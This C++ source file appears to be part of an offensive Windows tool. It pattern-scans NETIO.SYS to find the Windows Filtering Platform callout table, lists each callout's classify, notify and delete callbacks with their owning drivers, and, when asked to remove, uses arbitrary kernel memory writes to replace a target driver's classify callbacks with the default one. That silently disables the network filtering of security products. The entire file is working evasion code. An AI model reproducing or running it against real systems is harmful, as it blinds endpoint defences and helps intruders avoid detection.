#include "netUtil.h"
#include <tchar.h>



PVOID NetworkManager::ResolveDriverBase(const wchar_t* strDriverName)
{
	DWORD szBuffer = 0x2000;
	BOOL bRes = FALSE;
	DWORD dwSizeRequired = 0;
	wchar_t buffer[256] = { 0 };
	LPVOID lpBase = NULL;
	HANDLE hHeap = GetProcessHeap();
	if (!hHeap) {
		return NULL;
	}

	LPVOID lpBuf = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, szBuffer);
	if (!lpBuf) {
		return NULL;
	}

	bRes = EnumDeviceDrivers((LPVOID*)lpBuf, szBuffer, &dwSizeRequired);
	if (!bRes) {
		HeapFree(hHeap, 0, lpBuf);
		lpBuf = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwSizeRequired);
		if (!lpBuf) {
			return NULL;
		}
		szBuffer = dwSizeRequired;
		bRes = EnumDeviceDrivers((LPVOID*)lpBuf, szBuffer, &dwSizeRequired);
		if (!bRes) {
			printf("Failed to allocate space for device driver base array\n");
			return NULL;
		}
	}

	SIZE_T szNumDrivers = szBuffer / sizeof(PVOID);

	for (SIZE_T i = 0; i < szNumDrivers; i++) {
		PVOID lpBaseIter = ((LPVOID*)lpBuf)[i];
		GetDeviceDriverBaseNameW(lpBaseIter, buffer, 256);
		if (!lstrcmpiW(strDriverName, buffer)) {
			lpBase = lpBaseIter;
			break;
		}
	}

	HeapFree(hHeap, 0, lpBuf);
	return lpBase;
}

TCHAR* NetworkManager::FindDriver(DWORD64 address) {

	LPVOID drivers[1024];
	DWORD cbNeeded;
	int cDrivers, i;
	DWORD64 diff[3][200];
	TCHAR szDriver[1024];
	static TCHAR result[2048];  // Make sure it's large enough for the output

	if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers)) {
		int n = sizeof(drivers) / sizeof(drivers[0]);
		cDrivers = cbNeeded / sizeof(drivers[0]);
		int narrow = 0;
		int c = 0;
		for (i = 0; i < cDrivers; i++) {
			//we add all smaller addresses of drivers to a new array, then grab the closest. Not great, I know...
			if (address > (DWORD64)drivers[i]) {
				diff[0][c] = address;
				diff[1][c] = address - (DWORD64)drivers[i];
				diff[2][c] = (DWORD64)drivers[i];
				c++;
			}
		}
	}
	//cheeky for loop to find the smallest diff. smallest diff should be the diff of DriverBase + Diff == Callback function.
	int k = 0;
	DWORD64 temp = diff[1][0];
	for (k = 0; k < cDrivers; k++) {
		if ((temp > diff[1][k]) && (diff[0][k] == address)) {
			temp = diff[1][k];

		}
	}

	if (GetDeviceDriverBaseName(LPVOID(address - temp), szDriver, sizeof(szDriver))) {

		// Combine address, szDriver, and temp into a formatted string safely
		swprintf_s(result, sizeof(result) / sizeof(TCHAR), _T("%p [%s + 0x%llx]\n"),
			(void*)address, szDriver, temp);
	}
	else {
		swprintf_s(result, sizeof(result) / sizeof(TCHAR), _T("Could not resolve driver for %p\n"),
			(void*)address);
	}

	return result;
}

BOOL NetworkManager::Restore() {
	BOOL b = false;
	if (patchCallbackMap.size() > 0) {
		for (const auto& entry : patchCallbackMap) {
			DWORD64 address = entry.first;
			DWORD64 oldValue = entry.second.first;  // The old value we want to restore

			printf("Restoring value at address: %llx to old value: %llx\n", address, oldValue);

			// Write the old value back to the original memory location
			b = this->objMemHandler->WriteMemoryDWORD64(address, oldValue);

			if (!b) {
				printf("Failed to restore at address: %llx\n", address);
				return FALSE;
			}
		}
	}
	return b;
}

NetworkManager::NetworkManager(MemHandler* objMemHandlerArg)
{

	this->objMemHandler = objMemHandlerArg;
	this->lpNtosBase = this->ResolveDriverBase(L"ntoskrnl.exe");
	this->lpnetioBase = ResolveDriverBase(L"netio.sys");
}


BOOL NetworkManager::EnumerateNetworkFilters(BOOLEAN REMOVE, wchar_t* DriverName, DWORD64 ADDRESS) {
	
	LPVOID StartSearch = NULL;
	int numPatched = 0;
	LPVOID EndSearch = NULL;
	DWORD distance = 0;
	LPVOID pgWfpGlobal = NULL;
	LPVOID pFeDefaultClassifyCallback = NULL;
	LPVOID pInitDefaultCallout = NULL;
	DWORD FeDefaultClassifyCallback_offset = 0x00;

	HMODULE hNETIO = LoadLibraryExA(R"(C:\WINDOWS\System32\drivers\NETIO.SYS)", NULL, DONT_RESOLVE_DLL_REFERENCES);
	if (!hNETIO) {
		return NULL;
	}

	StartSearch = GetProcAddress(hNETIO, "FeGetWfpGlobalPtr");
	EndSearch = GetProcAddress(hNETIO, "KfdDeRefCallout");

	printf("StartSearch %llx\n", StartSearch);
	//lkd > u netio!FeInitCalloutTable L9
	//NETIO!FeInitCalloutTable:
	//	fffff802`3e575e54 4053            push    rbx
	//	fffff802`3e575e56 4883ec20        sub     rsp, 20h
	//	fffff802`3e575e5a 488b05df970500  mov     rax, qword ptr[NETIO!gWfpGlobal(fffff802`3e5cf640)]
	//	fffff802`3e575e61 0f57c0          xorps   xmm0, xmm0
	//	fffff802`3e575e64 ba57667043      mov     edx, 43706657h
	//	fffff802`3e575e69 b900800100      mov     ecx, 18000h
	//	fffff802`3e575e6e 0f118098010000  movups  xmmword ptr[rax + 198h], xmm0
	//	fffff802`3e575e75 4c8b05c4970500  mov     r8, qword ptr[NETIO!gWfpGlobal(fffff802`3e5cf640)] ; search for this
	//	fffff802`3e575e7c 4981c0a0010000  add     r8, 1A0h ; as well search for this
	//  BYTE patterngWfpGlobal[] = { 0x4C, 0x8B, 0x05, 0x49, 0x81, 0xC0 }; change them in netUtil.h

	while (StartSearch <= EndSearch) {
		if ((((PBYTE)StartSearch)[0] == patterngWfpGlobal[0]) && (((PBYTE)StartSearch)[1] == patterngWfpGlobal[1]) && (((PBYTE)StartSearch)[2] == patterngWfpGlobal[2]) && (((PBYTE)StartSearch)[7] == patterngWfpGlobal[3]) && (((PBYTE)StartSearch)[8] == patterngWfpGlobal[4]) && (((PBYTE)StartSearch)[9] == patterngWfpGlobal[5])) {
			distance = *(PDWORD)((DWORD_PTR)StartSearch + 3);
			pgWfpGlobal = (LPVOID)((DWORD_PTR)StartSearch + 7 + distance);
			break;
		}

		StartSearch = (LPVOID)((DWORD64)StartSearch + 0x01);
	}

	// Get the offset to the pointer containing the Important CFG Function
	DWORD gWfpGlobal_offset = (DWORD)pgWfpGlobal - (DWORD)hNETIO;
	DWORD SECOND_OFFSET = *(PDWORD)((DWORD_PTR)StartSearch + 10);
	DWORD FIRST_OFFSET = SECOND_OFFSET - 0x08;

	printf("gWfpGlobal_offset: %llx\n", gWfpGlobal_offset);
	printf("First_OFFSET: %llx\n", FIRST_OFFSET);
	printf("SECOND_OFFSET: %llx\n", SECOND_OFFSET);

	// Search for the structure Size
	// Search First for Call InitDefaultCallout
	// fffff806`3bb15ebc e81f000000      call    NETIO!InitDefaultCallout(fffff806`3bb15ee0)
	// fffff806`3bb15ec1 488bd8          mov     rbx, rax
	// fffff806`3bb15ec4 4885db          test    rbx, rbx
	while (StartSearch <= EndSearch) {
		if ((((PBYTE)StartSearch)[0] == patterngInitDefaultCallout[0]) && (((PBYTE)StartSearch)[1] == patterngInitDefaultCallout[1]) && (((PBYTE)StartSearch)[2] == patterngInitDefaultCallout[2]) && (((PBYTE)StartSearch)[3] == patterngInitDefaultCallout[3]) && (((PBYTE)StartSearch)[4] == patterngInitDefaultCallout[4]) && (((PBYTE)StartSearch)[5] == patterngInitDefaultCallout[5])) {
			distance = *(PDWORD)((DWORD_PTR)StartSearch - 4);
			pInitDefaultCallout = (LPVOID)((DWORD_PTR)StartSearch + distance); 
			break;
		}

		StartSearch = (LPVOID)((DWORD64)StartSearch + 0x01);
	}

	DWORD InitDefaultCallout_OFFSET = (DWORD)pInitDefaultCallout - (DWORD)hNETIO;
	printf("InitDefaultCallout_OFFSET: %llx\n", InitDefaultCallout_OFFSET);

	// Search for the structure size inside the function
	// NETIO!InitDefaultCallout:
	// fffff802`4dde5ee0 4053            push    rbx
	// fffff802`4dde5ee2 4883ec20        sub     rsp, 20h
	// fffff802`4dde5ee6 4c8d056b9f0500  lea     r8, [NETIO!gFeCallout(fffff802`4de3fe58)]
	// fffff802`4dde5eed ba57667043      mov     edx, 43706657h
	// fffff802`4dde5ef2 b960000000      mov     ecx, 60h
	StartSearch = pInitDefaultCallout;
	BYTE STRUCTURESIZE;
	while (true) {
		if ((((PBYTE)StartSearch)[0] == patterngCalloutStructureSize[0])) {
			STRUCTURESIZE = *(PDWORD)((DWORD_PTR)StartSearch + 1); //Get the distance from the call instruction
			break;
		}

		StartSearch = (LPVOID)((DWORD64)StartSearch + 0x01);
	}

	printf("STRUCTURESIZE: %llx\n", STRUCTURESIZE);

	printf("this->lpnetioBase: %llx\n", this->lpnetioBase);

	LPVOID pWfpGlobal = NULL;
	BOOL b = this->objMemHandler->VirtualRead(
		(DWORD64)this->lpnetioBase + gWfpGlobal_offset,
		&pWfpGlobal,
		sizeof(pWfpGlobal)
	);
	if (!b) return FALSE;

	printf("pWfpGlobal: %llx\n", pWfpGlobal);

	DWORD numberofentries = NULL;
	b = this->objMemHandler->VirtualRead(
		(DWORD64) pWfpGlobal + FIRST_OFFSET,
		&numberofentries,
		sizeof(numberofentries)
	);
	if (!b) return FALSE;

	printf("numberofentries: %llx\n", numberofentries);

	LPVOID pentries = NULL;
	b = this->objMemHandler->VirtualRead(
		(DWORD64) pWfpGlobal + SECOND_OFFSET,
		&pentries,
		sizeof(pentries)
	);
	if (!b) return FALSE;

	printf("pentries: %llx\n", pentries);

	if (REMOVE == TRUE) {
		// FIND FeDefaultClassifyCallback
		StartSearch = GetProcAddress(hNETIO, "FeGetWfpGlobalPtr");
		EndSearch = GetProcAddress(hNETIO, "KfdDeRefCallout");

		printf("StartSearch %llx\n", StartSearch);
		// fffff800`82f75f21 488d0578950000  lea     rax, [NETIO!FeDefaultClassifyCallback(fffff800`82f7f4a0)]
		// fffff800`82f75f28 c70104000000    mov     dword ptr[rcx], 4
		while (StartSearch <= EndSearch) {
			if ((((PBYTE)StartSearch)[0] == patterngFeDefaultClassifyCallback[0]) && (((PBYTE)StartSearch)[1] == patterngFeDefaultClassifyCallback[1]) && (((PBYTE)StartSearch)[2] == patterngFeDefaultClassifyCallback[2]) && (((PBYTE)StartSearch)[7] == patterngFeDefaultClassifyCallback[3]) && (((PBYTE)StartSearch)[8] == patterngFeDefaultClassifyCallback[4])) {
				distance = *(PDWORD)((DWORD_PTR)StartSearch + 3);
				pFeDefaultClassifyCallback = (LPVOID)((DWORD_PTR)StartSearch + 7 + distance);
				break;
			}

			StartSearch = (LPVOID)((DWORD64)StartSearch + 0x01);
		}

		FeDefaultClassifyCallback_offset = (DWORD)pFeDefaultClassifyCallback - (DWORD)hNETIO;
		printf("FeDefaultClassifyCallback_offset %llx\n", FeDefaultClassifyCallback_offset);
	}

	for (DWORD i = 0x00; i < numberofentries; ++i) {
		WFP_STRUCT* wfpstucture = new WFP_STRUCT();
		b = this->objMemHandler->VirtualRead(
			(DWORD64)pentries + STRUCTURESIZE * i,
			wfpstucture,
			sizeof(WFP_STRUCT)
		);
		if (!b) return FALSE;

		if (wfpstucture->secondDword == 0x01) {
			printf("-------------------------------------------------------------------------\n");
			printf("Entry Number: %d, WFP stucture entry pointer: %llx\n", i, (DWORD64)pentries + STRUCTURESIZE * i);
			if (wfpstucture->classifyFn != 0) {
				printf("[+] classifyFn: ");
				TCHAR* DriverOuput = FindDriver(wfpstucture->classifyFn);
				_tprintf(_T("%s"), DriverOuput);
				wchar_t* driverName = ExtractDriverName(DriverOuput);
				if (REMOVE == true) {
					if (DriverName != NULL && wcscmp(DriverName, driverName) == 0) {
						patchCallbackMap[(DWORD64)pentries + STRUCTURESIZE * i + 0x10] = std::make_pair((DWORD64)wfpstucture->classifyFn, (DWORD64)this->lpnetioBase + FeDefaultClassifyCallback_offset);

						b = this->objMemHandler->WriteMemoryDWORD64(
							(DWORD64) pentries + STRUCTURESIZE * i + 0x10,
							(DWORD64) this->lpnetioBase + FeDefaultClassifyCallback_offset
						);
						if (!b) return FALSE;
						puts("\t\t** PATCHED!");
						numPatched++;
					}
					else if (ADDRESS != NULL && ADDRESS == wfpstucture->classifyFn) {
						patchCallbackMap[(DWORD64)pentries + STRUCTURESIZE * i + 0x10] = std::make_pair((DWORD64)wfpstucture->classifyFn, (DWORD64)this->lpnetioBase + FeDefaultClassifyCallback_offset);
						b = this->objMemHandler->WriteMemoryDWORD64(
							(DWORD64)pentries + STRUCTURESIZE * i + 0x10,
							(DWORD64)this->lpnetioBase + FeDefaultClassifyCallback_offset
						);
						if (!b) return FALSE;
						puts("\t\t** PATCHED!");
						numPatched++;
					}
				}
			}
			if (wfpstucture->notifyFn != 0) {
				printf("[+] notifyFn: ");
				TCHAR* DriverOuput = FindDriver(wfpstucture->notifyFn);
				_tprintf(_T("%s"), DriverOuput);
				wchar_t* driverName = ExtractDriverName(DriverOuput);
				if (REMOVE == true) {
					if (DriverName != NULL && wcscmp(DriverName, driverName) == 0) {
						//printf("write 1\n");
					}
					else if (ADDRESS != NULL && ADDRESS == wfpstucture->notifyFn) {
						//printf("write 2\n");
					}
				}
			}
			if (wfpstucture->deleteFn != 0) {
				printf("[+] deleteFn: ");
				TCHAR* DriverOuput = FindDriver(wfpstucture->deleteFn);
				_tprintf(_T("%s"), DriverOuput);
				wchar_t* driverName = ExtractDriverName(DriverOuput);
				if (REMOVE == true) {
					if (DriverName != NULL && wcscmp(DriverName, driverName) == 0) {
						//printf("write 1\n");
					}
					else if (ADDRESS != NULL && ADDRESS == wfpstucture->deleteFn) {
						//printf("write 2\n");
					}
				}
			}
			if (wfpstucture->classifyFn2 != 0) {
				printf("[+] classifyFn: ");
				TCHAR* DriverOuput = FindDriver(wfpstucture->classifyFn2);
				_tprintf(_T("%s"), DriverOuput);
				wchar_t* driverName = ExtractDriverName(DriverOuput);
				if (REMOVE == true) {
					if (DriverName != NULL && wcscmp(DriverName, driverName) == 0) {
						patchCallbackMap[(DWORD64)pentries + STRUCTURESIZE * i + 0x28] = std::make_pair((DWORD64)wfpstucture->classifyFn2, (DWORD64)this->lpnetioBase + FeDefaultClassifyCallback_offset);

						b = this->objMemHandler->WriteMemoryDWORD64(
							(DWORD64)pentries + STRUCTURESIZE * i + 0x28,
							(DWORD64)this->lpnetioBase + FeDefaultClassifyCallback_offset
						);
						if (!b) return FALSE;
						puts("\t\t** PATCHED!");
						numPatched++;
					}
					else if (ADDRESS != NULL && ADDRESS == wfpstucture->classifyFn2) {
						patchCallbackMap[(DWORD64)pentries + STRUCTURESIZE * i + 0x28] = std::make_pair((DWORD64)wfpstucture->classifyFn2, (DWORD64)this->lpnetioBase + FeDefaultClassifyCallback_offset);

						b = this->objMemHandler->WriteMemoryDWORD64(
							(DWORD64)pentries + STRUCTURESIZE * i + 0x28,
							(DWORD64)this->lpnetioBase + FeDefaultClassifyCallback_offset
						);
						if (!b) return FALSE;
						puts("\t\t** PATCHED!");
						numPatched++;
					}
				}
			}
		}
	}
	printf("Patched %d callbacks\n", numPatched);
}

// Function to extract the driver name from a TCHAR* input and return it as wchar_t*
wchar_t* NetworkManager::ExtractDriverName(TCHAR* driverOutput) {
	// Find the start of the driver name (after the '[')
	TCHAR* start = _tcschr(driverOutput, _T('['));
	if (!start) return NULL;  // Return NULL if '[' is not found

	// Find the end of the driver name (space or '+')
	TCHAR* end = _tcschr(start, _T(' '));
	if (!end) return NULL;  // Return NULL if no space is found

	// Calculate the length of the driver name
	size_t length = end - start - 1;

	// Allocate memory for the wide-character (wchar_t*) driver name
	wchar_t* driverName = (wchar_t*)malloc((length + 1) * sizeof(wchar_t));
	if (!driverName) return NULL;  // Return NULL if memory allocation fails

	// Copy the driver name into the wchar_t buffer
#ifdef UNICODE
	if (wcsncpy_s(driverName, length + 1, start + 1, length) != 0) {
		free(driverName);
		return NULL;  // Return NULL if copying fails
	}
#else
	size_t convertedChars = 0;
	if (mbstowcs_s(&convertedChars, driverName, length + 1, start + 1, length) != 0) {
		free(driverName);
		return NULL;  // Return NULL if conversion fails
	}
#endif

	driverName[length] = L'\0';  // Null-terminate the string

	return driverName;
}

NetworkManager::~NetworkManager()
{
}
